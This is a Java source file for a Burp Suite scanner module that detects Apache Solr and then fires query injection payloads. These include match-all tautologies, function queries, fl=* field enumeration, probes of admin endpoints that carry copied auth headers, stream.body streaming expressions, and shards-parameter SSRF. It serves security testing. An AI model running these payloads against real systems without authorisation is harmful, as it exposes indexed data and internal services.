package com.omnistrike.modules.injection;

import burp.api.montoya.MontoyaApi;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.params.HttpParameter;
import burp.api.montoya.http.message.params.HttpParameterType;
import burp.api.montoya.http.message.requests.HttpRequest;
import com.omnistrike.framework.*;
import com.omnistrike.model.*;

import java.util.*;
import java.util.regex.Pattern;

/**
 * MODULE: Apache Solr Query Injection Scanner
 *
 * This module CANNOT be manually triggered by the user. It is an active module
 * that passively gates on Apache Solr indicators in responses. Only when
 * Solr is confirmed does it fire query injection payloads.
 *
 * Flow:
 *   1. Receives request/response via processHttpFlow() during active scanning
 *   2. Checks the RESPONSE body for Solr error indicators OR URL for Solr patterns
 *   3. If NO Solr indicators -> returns empty (zero payloads sent)
 *   4. If Solr detected -> reports INFO finding, then injects Solr query payloads
 *   5. 4 attack phases: Query Injection, Field Enumeration, Core/Collection Enum, Function Query / RCE risk
 *
 * Stop-scan: Respects ScanState.isCancelled() and Thread.isInterrupted().
 */
public class SolrQueryScanner implements ScanModule {

    private static final String MODULE_ID = "solr-query-scanner";

    private MontoyaApi api;
    private ModuleConfig config;
    private DeduplicationStore dedup;
    private FindingsStore findingsStore;

    // ── Solr detection patterns (passive gate) ──────────────────────────────

    // Error messages that confirm Apache Solr / Lucene — only strong indicators
    // Removed: ParseException (generic Java), maxBooleanClauses (Elasticsearch too),
    //          QueryParsingException (generic), Expected.*got.*solr (fragile)
    private static final Pattern SOLR_ERROR_PATTERN = Pattern.compile(
            "SolrException|"
                    + "org\\.apache\\.solr|"
                    + "org\\.apache\\.lucene|"
                    + "SyntaxError.*(?:solr|lucene)|"
                    + "(?:Solr|Lucene).*undefined field|"
                    + "Can not sort on multivalued field",
            Pattern.CASE_INSENSITIVE);

    // URL patterns that strongly indicate Apache Solr endpoints
    // Removed: /select? (too generic), /update? (generic), qt=, wt=, qf=, pf=, defType= (generic params)
    // Only patterns with /solr/ prefix are Solr-specific
    private static final Pattern SOLR_URL_PATTERN = Pattern.compile(
            "/solr/\\w+/select|"
                    + "/solr/\\w+/update|"
                    + "/solr/admin/",
            Pattern.CASE_INSENSITIVE);

    // ── Solr query parameter names ────────────────────────────────────────

    private static final Set<String> SOLR_PARAM_NAMES = Set.of(
            "q", "fq", "sort", "fl", "facet.query", "facet.field",
            "bf", "bq", "qf", "pf", "mm", "q.op", "deftype");

    // Solr query syntax indicators in parameter values
    private static final Pattern SOLR_SYNTAX_PATTERN = Pattern.compile(
            "\\*:\\*|\\w+:\\w+|\\bAND\\b|\\bOR\\b|\\bNOT\\b|\\bTO\\b|[\\[{]",
            Pattern.CASE_INSENSITIVE);

    // ── ScanModule interface ────────────────────────────────────────────────

    @Override public String getId() { return MODULE_ID; }
    @Override public String getName() { return "Apache Solr Query Injection"; }
    @Override public String getDescription() {
        return "Detects Apache Solr and tests for query injection, field enumeration, "
                + "core/collection enumeration, and function query abuse. "
                + "Only activates when Solr indicators are detected in responses or URLs.";
    }
    @Override public ModuleCategory getCategory() { return ModuleCategory.INJECTION; }
    @Override public boolean isPassive() { return false; } // Active module with passive gate

    @Override
    public void initialize(MontoyaApi api, ModuleConfig config) {
        this.api = api;
        this.config = config;
    }

    public void setDependencies(DeduplicationStore dedup, FindingsStore findingsStore,
                                 CollaboratorManager collaboratorManager) {
        this.dedup = dedup;
        this.findingsStore = findingsStore;
        // collaboratorManager not used — no OOB needed for Solr query injection
    }

    @Override public void destroy() {}

    // ── Main entry point ────────────────────────────────────────────────────

    @Override
    public List<Finding> processHttpFlow(HttpRequestResponse requestResponse, MontoyaApi api) {
        if (requestResponse.response() == null) return Collections.emptyList();

        String url = requestResponse.request().url();
        String urlPath = extractPath(url);

        // PASSIVE GATE: Check response for Solr indicators
        SolrDetection detection = detectSolr(requestResponse);
        if (detection == null) return Collections.emptyList();

        // Solr confirmed — report INFO finding
        if (dedup.markIfNew(MODULE_ID, urlPath, "solr-detected")) {
            findingsStore.addFinding(Finding.builder(MODULE_ID,
                            "Apache Solr Detected",
                            Severity.INFO, Confidence.CERTAIN)
                    .url(url)
                    .evidence(detection.evidence)
                    .description("The target application is running Apache Solr. "
                            + "Query injection testing will be performed automatically.")
                    .requestResponse(requestResponse)
                    .build());
            api.logging().logToOutput("[Solr] Apache Solr detected: " + url + " | " + detection.evidence);
        }

        // ACTIVE ATTACK: Inject Solr query payloads
        try {
            testSolrInjection(requestResponse, detection, url, urlPath);
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
        }

        return Collections.emptyList();
    }

    // ── Solr Detection (passive gate) ───────────────────────────────────────

    private SolrDetection detectSolr(HttpRequestResponse reqResp) {
        String body = reqResp.response().bodyToString();
        if (body == null) body = "";
        String url = reqResp.request().url();

        // Check 1: Error messages in response body (strongest signal)
        if (SOLR_ERROR_PATTERN.matcher(body).find()) {
            return new SolrDetection("Solr error pattern in response body");
        }

        // Check 2: URL pattern + Solr response body markers (require both — URL alone is not enough)
        if (SOLR_URL_PATTERN.matcher(url).find()) {
            if (body.contains("\"responseHeader\"") || body.contains("\"QTime\"")
                    || body.contains("\"numFound\"")
                    || (body.contains("\"response\"") && body.contains("\"docs\""))) {
                return new SolrDetection("Solr URL pattern (" + url + ") + Solr response body markers");
            }
        }

        return null; // No Solr detected — module stays dormant
    }

    // ── Active Solr Injection Testing ───────────────────────────────────────

    private void testSolrInjection(HttpRequestResponse original, SolrDetection detection,
                                    String url, String urlPath) throws InterruptedException {
        HttpRequest request = original.request();

        // Find the injectable parameter(s) — prioritize Solr query parameters
        List<InjectableParam> targets = identifyTargets(request);
        if (targets.isEmpty()) return;

        for (InjectableParam target : targets) {
            if (Thread.currentThread().isInterrupted() || ScanState.isCancelled()) return;
            if (!dedup.markIfNew(MODULE_ID, urlPath, target.name)) continue;

            api.logging().logToOutput("[Solr] Testing parameter '" + target.name + "' on " + url);

            // Phase 1: Query Injection (match-all, tautology)
            testQueryInjection(original, target, url);

            // Phase 2: Field Enumeration
            if (Thread.currentThread().isInterrupted() || ScanState.isCancelled()) return;
            testFieldEnumeration(original, target, url);

            // Phase 3: Core/Collection Enumeration
            if (Thread.currentThread().isInterrupted() || ScanState.isCancelled()) return;
            testCoreEnumeration(original, url, urlPath);

            // Phase 4: Function Query / Remote Code Risk
            if (Thread.currentThread().isInterrupted() || ScanState.isCancelled()) return;
            testFunctionQuery(original, target, url);
        }
    }

    // ── Phase 1: Query Injection ────────────────────────────────────────────

    private void testQueryInjection(HttpRequestResponse original, InjectableParam target,
                                     String url) throws InterruptedException {
        String baselineBody = original.response().bodyToString();
        if (baselineBody == null) baselineBody = "";
        int baselineNumFound = extractNumFound(baselineBody);

        // Test 1: Inject *:* (match all documents)
        if (Thread.currentThread().isInterrupted() || ScanState.isCancelled()) return;
        {
            HttpRequestResponse result = sendPayload(original, target, "*:*");
            if (result != null && result.response() != null
                    && !(result.response().statusCode() >= 400 && result.response().statusCode() < 500)) {
                if (ResponseGuard.isUsableResponse(result)) {
                    String resultBody = result.response().bodyToString();
                    if (resultBody == null) resultBody = "";
                    int resultNumFound = extractNumFound(resultBody);

                    // Check: numFound increased by > 2, and response contains Solr response format
                    if (resultNumFound > baselineNumFound + 2
                            && resultBody.contains("\"response\"")
                            && resultBody.contains("\"docs\"")
                            && result.response().statusCode() == 200) {
                        findingsStore.addFinding(Finding.builder(MODULE_ID,
                                        "Solr Query Injection — Match All (*:*)",
                                        Severity.HIGH, Confidence.FIRM)
                                .url(url).parameter(target.name)
                                .evidence("Injected *:* returned numFound=" + resultNumFound
                                        + " vs baseline numFound=" + baselineNumFound
                                        + ". Response contains Solr JSON format markers.")
                                .payload("*:*")
                                .requestResponse(result)
                                .build());
                        return; // One confirmed finding per phase
                    }
                }
            }
            perHostDelay();
        }

        // Test 2: Tautology — append OR *:* to existing query
        if (Thread.currentThread().isInterrupted() || ScanState.isCancelled()) return;
        {
            String tautologyPayload = target.originalValue + " OR *:*";
            HttpRequestResponse result = sendPayload(original, target, tautologyPayload);
            if (result != null && result.response() != null
                    && !(result.response().statusCode() >= 400 && result.response().statusCode() < 500)) {
                if (ResponseGuard.isUsableResponse(result)) {
                    String resultBody = result.response().bodyToString();
                    if (resultBody == null) resultBody = "";
                    int resultNumFound = extractNumFound(resultBody);

                    if (resultNumFound > baselineNumFound + 2
                            && resultBody.contains("\"response\"")
                            && resultBody.contains("\"docs\"")
                            && result.response().statusCode() == 200) {
                        findingsStore.addFinding(Finding.builder(MODULE_ID,
                                        "Solr Query Injection — Tautology (OR *:*)",
                                        Severity.HIGH, Confidence.FIRM)
                                .url(url).parameter(target.name)
                                .evidence("Appended ' OR *:*' returned numFound=" + resultNumFound
                                        + " vs baseline numFound=" + baselineNumFound
                                        + ". Query tautology bypassed the original filter.")
                                .payload(tautologyPayload)
                                .requestResponse(result)
                                .build());
                        return;
                    }
                }
            }
            perHostDelay();
        }

        // Test 3: Range wildcard — _val_:"1" (function query, always returns score)
        if (Thread.currentThread().isInterrupted() || ScanState.isCancelled()) return;
        {
            String rangePayload = target.originalValue + " OR _val_:\"1\"";
            HttpRequestResponse result = sendPayload(original, target, rangePayload);
            if (result != null && result.response() != null
                    && !(result.response().statusCode() >= 400 && result.response().statusCode() < 500)) {
                if (ResponseGuard.isUsableResponse(result)) {
                    String resultBody = result.response().bodyToString();
                    if (resultBody == null) resultBody = "";
                    int resultNumFound = extractNumFound(resultBody);

                    if (resultNumFound > baselineNumFound + 2
                            && baselineNumFound >= 0 && resultNumFound >= 0
                            && resultBody.contains("\"response\"")
                            && resultBody.contains("\"docs\"")
                            && result.response().statusCode() == 200
                            && !resultBody.equals(baselineBody)) {
                        findingsStore.addFinding(Finding.builder(MODULE_ID,
                                        "Solr Query Injection — Function Query (_val_)",
                                        Severity.HIGH, Confidence.FIRM)
                                .url(url).parameter(target.name)
                                .evidence("Injected _val_ function query returned numFound=" + resultNumFound
                                        + " vs baseline numFound=" + baselineNumFound
                                        + ". Function query syntax was interpreted.")
                                .payload(rangePayload)
                                .requestResponse(result)
                                .build());
                        perHostDelay();
                        return;
                    }
                }
            }
            perHostDelay();
        }
    }

    // ── Phase 2: Field Enumeration ──────────────────────────────────────────

    private void testFieldEnumeration(HttpRequestResponse original, InjectableParam target,
                                       String url) throws InterruptedException {
        String baselineBody = original.response().bodyToString();
        if (baselineBody == null) baselineBody = "";

        // Test 1: Inject fl=* to return all fields
        if (Thread.currentThread().isInterrupted() || ScanState.isCancelled()) return;
        {
            HttpRequestResponse result = sendWithExtraParam(original, "fl", "*");
            if (result != null && result.response() != null
                    && !(result.response().statusCode() >= 400 && result.response().statusCode() < 500)) {
                if (ResponseGuard.isUsableResponse(result)) {
                    String resultBody = result.response().bodyToString();
                    if (resultBody == null) resultBody = "";

                    int newFieldCount = countNewJsonKeys(baselineBody, resultBody);
                    if (newFieldCount >= 3 && result.response().statusCode() == 200) {
                        findingsStore.addFinding(Finding.builder(MODULE_ID,
                                        "Solr Field Enumeration — fl=* exposed " + newFieldCount + " extra fields",
                                        Severity.MEDIUM, Confidence.FIRM)
                                .url(url).parameter("fl")
                                .evidence("Injected fl=* returned " + newFieldCount
                                        + " additional JSON keys not in baseline response. "
                                        + "All indexed fields are exposed.")
                                .payload("fl=*")
                                .requestResponse(result)
                                .build());
                        return;
                    }
                }
            }
            perHostDelay();
        }

        // Test 2: Inject fl=*,score,[explain] for scoring details
        if (Thread.currentThread().isInterrupted() || ScanState.isCancelled()) return;
        {
            HttpRequestResponse result = sendWithExtraParam(original, "fl", "*,score,[explain]");
            if (result != null && result.response() != null
                    && !(result.response().statusCode() >= 400 && result.response().statusCode() < 500)) {
                if (ResponseGuard.isUsableResponse(result)) {
                    String resultBody = result.response().bodyToString();
                    if (resultBody == null) resultBody = "";

                    int newFieldCount = countNewJsonKeys(baselineBody, resultBody);
                    if (newFieldCount >= 3 && result.response().statusCode() == 200) {
                        findingsStore.addFinding(Finding.builder(MODULE_ID,
                                        "Solr Field Enumeration — fl=*,score,[explain] exposed " + newFieldCount + " extra fields",
                                        Severity.MEDIUM, Confidence.FIRM)
                                .url(url).parameter("fl")
                                .evidence("Injected fl=*,score,[explain] returned " + newFieldCount
                                        + " additional JSON keys including scoring details.")
                                .payload("fl=*,score,[explain]")
                                .requestResponse(result)
                                .build());
                        return;
                    }
                }
            }
            perHostDelay();
        }
    }

    // ── Phase 3: Core/Collection Enumeration ────────────────────────────────

    private void testCoreEnumeration(HttpRequestResponse original, String url,
                                      String urlPath) throws InterruptedException {
        // Only test core enumeration once per host path prefix (not per-parameter)
        if (!dedup.markIfNew(MODULE_ID, urlPath, "core-enum")) return;

        String baseUrl = extractBaseUrl(url);

        // Probe 1: /solr/admin/cores?action=STATUS
        if (Thread.currentThread().isInterrupted() || ScanState.isCancelled()) return;
        {
            String probeUrl = baseUrl + "/solr/admin/cores?action=STATUS";
            HttpRequestResponse result = sendProbeRequest(original, probeUrl);
            if (result != null && result.response() != null) {
                if (ResponseGuard.isUsableResponse(result)) {
                    String resultBody = result.response().bodyToString();
                    if (resultBody == null) resultBody = "";

                    // Require at least one Solr-specific marker (not just generic "status")
                    if (result.response().statusCode() == 200
                            && (resultBody.contains("\"instanceDir\"") || resultBody.contains("\"dataDir\"")
                            || resultBody.contains("\"baseUrl\""))) {

                        // Differential probe: verify non-admin endpoint gives different response
                        HttpRequestResponse control = sendProbeRequest(original,
                                baseUrl + "/solr/nonexistent_path_" + System.currentTimeMillis());
                        perHostDelay();
                        boolean differential = true;
                        if (control != null && control.response() != null) {
                            String controlBody = control.response().bodyToString();
                            if (controlBody != null && controlBody.equals(resultBody)) {
                                differential = false; // Same response = generic catch-all
                            }
                        }

                        if (differential) {
                            findingsStore.addFinding(Finding.builder(MODULE_ID,
                                            "Solr Admin — Core Listing Exposed",
                                            Severity.HIGH, Confidence.FIRM)
                                    .url(probeUrl)
                                    .evidence("Admin endpoint /solr/admin/cores?action=STATUS returned "
                                            + "Solr core metadata. Differential probe confirmed unique response.")
                                    .payload(probeUrl)
                                    .requestResponse(result)
                                    .build());
                        }
                    }
                }
            }
            perHostDelay();
        }

        // Probe 2: /solr/admin/info/system for version/system info
        if (Thread.currentThread().isInterrupted() || ScanState.isCancelled()) return;
        {
            String probeUrl = baseUrl + "/solr/admin/info/system";
            HttpRequestResponse result = sendProbeRequest(original, probeUrl);
            if (result != null && result.response() != null) {
                if (ResponseGuard.isUsableResponse(result)) {
                    String resultBody = result.response().bodyToString();
                    if (resultBody == null) resultBody = "";

                    if (result.response().statusCode() == 200
                            && (resultBody.contains("\"lucene\"") || resultBody.contains("\"solr-spec-version\"")
                            || resultBody.contains("\"solr_home\""))) {
                        findingsStore.addFinding(Finding.builder(MODULE_ID,
                                        "Solr Admin — System Info Exposed",
                                        Severity.MEDIUM, Confidence.FIRM)
                                .url(probeUrl)
                                .evidence("Admin endpoint /solr/admin/info/system returned "
                                        + "Solr version and system information.")
                                .payload(probeUrl)
                                .requestResponse(result)
                                .build());
                    }
                }
            }
            perHostDelay();
        }

        // Probe 3: /solr/admin/collections?action=LIST for SolrCloud
        if (Thread.currentThread().isInterrupted() || ScanState.isCancelled()) return;
        {
            String probeUrl = baseUrl + "/solr/admin/collections?action=LIST";
            HttpRequestResponse result = sendProbeRequest(original, probeUrl);
            if (result != null && result.response() != null) {
                if (ResponseGuard.isUsableResponse(result)) {
                    String resultBody = result.response().bodyToString();
                    if (resultBody == null) resultBody = "";

                    // Require "collections" specifically — "status" alone is too generic
                    if (result.response().statusCode() == 200
                            && resultBody.contains("\"collections\"")) {

                        // Differential probe
                        HttpRequestResponse control = sendProbeRequest(original,
                                baseUrl + "/solr/admin/nonexistent_" + System.currentTimeMillis());
                        perHostDelay();
                        boolean differential = true;
                        if (control != null && control.response() != null) {
                            String controlBody = control.response().bodyToString();
                            if (controlBody != null && controlBody.equals(resultBody)) {
                                differential = false;
                            }
                        }

                        if (differential) {
                            findingsStore.addFinding(Finding.builder(MODULE_ID,
                                            "Solr Admin — SolrCloud Collection Listing Exposed",
                                            Severity.HIGH, Confidence.FIRM)
                                    .url(probeUrl)
                                    .evidence("Admin endpoint /solr/admin/collections?action=LIST returned "
                                            + "SolrCloud collection list. Differential probe confirmed unique response.")
                                    .payload(probeUrl)
                                    .requestResponse(result)
                                    .build());
                        }
                    }
                }
            }
            perHostDelay();
        }
    }

    // ── Phase 4: Function Query / Remote Code Risk ──────────────────────────

    private void testFunctionQuery(HttpRequestResponse original, InjectableParam target,
                                    String url) throws InterruptedException {
        String baselineBody = original.response().bodyToString();
        if (baselineBody == null) baselineBody = "";

        // Test 1: Param dereferencing — fl=*,[value v=$a]&a=test
        if (Thread.currentThread().isInterrupted() || ScanState.isCancelled()) return;
        {
            HttpRequestResponse result = sendWithExtraParams(original,
                    new String[]{"fl", "*,[value v=$a]", "a", "omnistrike_deref_test"});
            if (result != null && result.response() != null
                    && !(result.response().statusCode() >= 400 && result.response().statusCode() < 500)) {
                if (ResponseGuard.isUsableResponse(result)) {
                    String resultBody = result.response().bodyToString();
                    if (resultBody == null) resultBody = "";

                    // Check if our dereferenced value appeared in the response
                    if (resultBody.contains("omnistrike_deref_test")
                            && !baselineBody.contains("omnistrike_deref_test")
                            && result.response().statusCode() == 200) {
                        findingsStore.addFinding(Finding.builder(MODULE_ID,
                                        "Solr Parameter Dereferencing — Variable Substitution",
                                        Severity.HIGH, Confidence.FIRM)
                                .url(url).parameter("fl")
                                .evidence("Parameter dereferencing via [value v=$a]&a=test returned "
                                        + "the substituted value in response. Attacker can inject arbitrary "
                                        + "values via Solr variable substitution.")
                                .payload("fl=*,[value v=$a]&a=omnistrike_deref_test")
                                .requestResponse(result)
                                .build());
                    }
                }
            }
            perHostDelay();
        }

        // Test 2: Streaming expressions via stream.body (Solr >= 6)
        if (Thread.currentThread().isInterrupted() || ScanState.isCancelled()) return;
        {
            String streamPayload = "search(collection1,q=*:*,fl=\"id\",sort=\"id asc\")";
            HttpRequestResponse result = sendWithExtraParam(original, "stream.body", streamPayload);
            if (result != null && result.response() != null) {
                if (ResponseGuard.isUsableResponse(result)) {
                    String resultBody = result.response().bodyToString();
                    if (resultBody == null) resultBody = "";

                    // Check for streaming response format or Solr-specific error indicating streams are enabled
                    // Removed "docs" — matches every normal Solr response, not stream-specific
                    // Only "result-set" is stream-specific; "EXCEPTION" matches any Solr error
                    boolean hasStreamResponse = resultBody.contains("\"result-set\"");
                    boolean hasStreamError = resultBody.contains("streaming")
                            || resultBody.contains("stream.body");

                    if (result.response().statusCode() == 200 && hasStreamResponse
                            && !resultBody.equals(baselineBody)) {
                        findingsStore.addFinding(Finding.builder(MODULE_ID,
                                        "Solr Streaming Expressions Enabled — stream.body",
                                        Severity.CRITICAL, Confidence.FIRM)
                                .url(url).parameter("stream.body")
                                .evidence("stream.body parameter accepted streaming expression. "
                                        + "This enables arbitrary data extraction and potential remote code execution "
                                        + "via Solr streaming expressions API.")
                                .payload("stream.body=" + streamPayload)
                                .requestResponse(result)
                                .build());
                    } else if (hasStreamError && !baselineBody.contains("stream.body")) {
                        // Stream-specific error = feature is recognized but may be restricted
                        findingsStore.addFinding(Finding.builder(MODULE_ID,
                                        "Solr Streaming Expressions Recognized — stream.body",
                                        Severity.MEDIUM, Confidence.TENTATIVE)
                                .url(url).parameter("stream.body")
                                .evidence("stream.body parameter triggered stream-specific error response. "
                                        + "Streaming expressions feature is recognized by the server.")
                                .payload("stream.body=" + streamPayload)
                                .requestResponse(result)
                                .build());
                    }
                }
            }
            perHostDelay();
        }

        // Test 3: SSRF via shards parameter
        if (Thread.currentThread().isInterrupted() || ScanState.isCancelled()) return;
        {
            // Use a localhost URL — if Solr follows it, it confirms SSRF
            String shardsPayload = "http://127.0.0.1:8983/solr/collection1/select";
            HttpRequestResponse result = sendWithExtraParam(original, "shards", shardsPayload);
            if (result != null && result.response() != null) {
                if (ResponseGuard.isUsableResponse(result)) {
                    String resultBody = result.response().bodyToString();
                    if (resultBody == null) resultBody = "";

                    // Check for SSRF indicators: connection errors to our shard, or Solr-specific
                    // shard routing errors that confirm the parameter was processed
                    // Only connection-error indicators confirm SSRF; bare "shards"/"shard" too generic
                    boolean hasShardError = resultBody.contains("Connection refused")
                            || resultBody.contains("connect timed out")
                            || resultBody.contains("No live SolrServers");
                    boolean differentFromBaseline = !resultBody.equals(baselineBody);

                    if (hasShardError && differentFromBaseline
                            && !baselineBody.contains("Connection refused")
                            && !baselineBody.contains("No live SolrServers")) {
                        findingsStore.addFinding(Finding.builder(MODULE_ID,
                                        "Solr SSRF Risk — Shards Parameter Accepted",
                                        Severity.HIGH, Confidence.FIRM)
                                .url(url).parameter("shards")
                                .evidence("The shards parameter triggered a server-side connection attempt. "
                                        + "Error response confirms Solr attempted to reach the specified shard URL. "
                                        + "This can be leveraged for SSRF attacks.")
                                .payload("shards=" + shardsPayload)
                                .requestResponse(result)
                                .build());
                    }
                }
            }
            perHostDelay();
        }
    }

    // ── Target Identification ───────────────────────────────────────────────

    private List<InjectableParam> identifyTargets(HttpRequest request) {
        List<InjectableParam> targets = new ArrayList<>();

        for (var param : request.parameters()) {
            String name = param.name().toLowerCase();
            String value = param.value();
            if (value == null || value.isEmpty()) continue;

            // Priority 1: Parameter value contains Solr query syntax
            if (SOLR_SYNTAX_PATTERN.matcher(value).find()) {
                targets.add(0, new InjectableParam(param.name(), value, param.type(), true));
                continue;
            }

            // Priority 2: Parameter name matches known Solr parameter names
            if (SOLR_PARAM_NAMES.contains(name)) {
                targets.add(new InjectableParam(param.name(), value, param.type(), false));
            }
        }

        // If no specific targets found, don't test random parameters
        // Solr injection only makes sense on Solr-related parameters
        return targets;
    }

    // ── HTTP Request Sending ────────────────────────────────────────────────

    /**
     * Send the original request with a parameter value replaced.
     */
    private HttpRequestResponse sendPayload(HttpRequestResponse original, InjectableParam target,
                                             String payload) {
        if (ScanState.isCancelled()) return null;

        try {
            HttpRequest modified;
            switch (target.paramType) {
                case URL:
                    modified = original.request().withUpdatedParameters(
                            HttpParameter.urlParameter(target.name, payload));
                    break;
                case BODY:
                    modified = original.request().withUpdatedParameters(
                            HttpParameter.bodyParameter(target.name, payload));
                    break;
                default:
                    return null;
            }

            HttpRequestResponse result = api.http().sendRequest(modified);
            if (result != null && !ResponseGuard.isUsableResponse(result)) return null;
            return result;
        } catch (Exception e) {
            if (Thread.interrupted()) Thread.currentThread().interrupt();
            return null;
        }
    }

    /**
     * Send the original request with an additional URL parameter added.
     */
    private HttpRequestResponse sendWithExtraParam(HttpRequestResponse original,
                                                    String paramName, String paramValue) {
        if (ScanState.isCancelled()) return null;

        try {
            HttpRequest modified = original.request().withAddedParameters(
                    HttpParameter.urlParameter(paramName, paramValue));

            HttpRequestResponse result = api.http().sendRequest(modified);
            if (result != null && !ResponseGuard.isUsableResponse(result)) return null;
            return result;
        } catch (Exception e) {
            if (Thread.interrupted()) Thread.currentThread().interrupt();
            return null;
        }
    }

    /**
     * Send the original request with multiple additional URL parameters added.
     * Params are provided as alternating name/value pairs: [name1, value1, name2, value2, ...]
     */
    private HttpRequestResponse sendWithExtraParams(HttpRequestResponse original, String[] params) {
        if (ScanState.isCancelled()) return null;

        try {
            List<HttpParameter> extraParams = new ArrayList<>();
            for (int i = 0; i + 1 < params.length; i += 2) {
                extraParams.add(HttpParameter.urlParameter(params[i], params[i + 1]));
            }

            HttpRequest modified = original.request().withAddedParameters(
                    extraParams.toArray(new HttpParameter[0]));

            HttpRequestResponse result = api.http().sendRequest(modified);
            if (result != null && !ResponseGuard.isUsableResponse(result)) return null;
            return result;
        } catch (Exception e) {
            if (Thread.interrupted()) Thread.currentThread().interrupt();
            return null;
        }
    }

    /**
     * Send a standalone GET probe request to an arbitrary URL.
     * Copies headers from the original request for session context.
     */
    private HttpRequestResponse sendProbeRequest(HttpRequestResponse original, String probeUrl) {
        if (ScanState.isCancelled()) return null;

        try {
            HttpRequest probe = HttpRequest.httpRequestFromUrl(probeUrl);
            // Copy relevant headers from original for auth context
            for (var header : original.request().headers()) {
                String name = header.name().toLowerCase();
                if (name.equals("cookie") || name.equals("authorization")
                        || name.startsWith("x-")) {
                    probe = probe.withRemovedHeader(header.name())
                            .withAddedHeader(header.name(), header.value());
                }
            }

            HttpRequestResponse result = api.http().sendRequest(probe);
            if (result != null && !ResponseGuard.isUsableResponse(result)) return null;
            return result;
        } catch (Exception e) {
            if (Thread.interrupted()) Thread.currentThread().interrupt();
            return null;
        }
    }

    // ── Utility Methods ─────────────────────────────────────────────────────

    /**
     * Extract the "numFound" value from a Solr JSON response.
     * Returns -1 if not found.
     */
    private int extractNumFound(String body) {
        if (body == null) return -1;
        // Pattern: "numFound":12345
        java.util.regex.Matcher m = Pattern.compile("\"numFound\"\\s*:\\s*(\\d+)").matcher(body);
        if (m.find()) {
            try {
                return Integer.parseInt(m.group(1));
            } catch (NumberFormatException e) {
                return -1;
            }
        }
        return -1;
    }

    private int countNewJsonKeys(String baseline, String result) {
        // Count JSON keys in result that don't appear in baseline
        Pattern keyPattern = Pattern.compile("\"(\\w+)\"\\s*:");
        Set<String> baselineKeys = new HashSet<>();
        var bm = keyPattern.matcher(baseline);
        while (bm.find()) baselineKeys.add(bm.group(1));

        Set<String> newKeys = new HashSet<>();
        var rm = keyPattern.matcher(result);
        while (rm.find()) {
            if (!baselineKeys.contains(rm.group(1))) newKeys.add(rm.group(1));
        }
        return newKeys.size();
    }

    private void perHostDelay() throws InterruptedException {
        int delay = config.getInt("solr.perHostDelay", 500);
        if (delay > 0) Thread.sleep(delay);
    }

    private String extractPath(String url) {
        try {
            int s = url.indexOf("://");
            if (s >= 0) { int q = url.indexOf('?', s + 3); return q >= 0 ? url.substring(s, q) : url.substring(s); }
        } catch (Exception ignored) {}
        return url;
    }

    /**
     * Extract the base URL (scheme + host + port) from a full URL.
     * E.g., "http://example.com:8983/solr/core/select?q=test" -> "http://example.com:8983"
     */
    private String extractBaseUrl(String url) {
        try {
            int schemeEnd = url.indexOf("://");
            if (schemeEnd < 0) return url;
            int pathStart = url.indexOf('/', schemeEnd + 3);
            if (pathStart < 0) return url;
            return url.substring(0, pathStart);
        } catch (Exception e) {
            return url;
        }
    }

    // ── Inner classes ───────────────────────────────────────────────────────

    private static class SolrDetection {
        final String evidence;
        SolrDetection(String evidence) {
            this.evidence = evidence;
        }
    }

    private static class InjectableParam {
        final String name;
        final String originalValue;
        final HttpParameterType paramType;
        final boolean hasSolrSyntax; // true if the value contains Solr query syntax

        InjectableParam(String name, String originalValue,
                         HttpParameterType paramType, boolean hasSolrSyntax) {
            this.name = name;
            this.originalValue = originalValue;
            this.paramType = paramType;
            this.hasSolrSyntax = hasSolrSyntax;
        }
    }
}
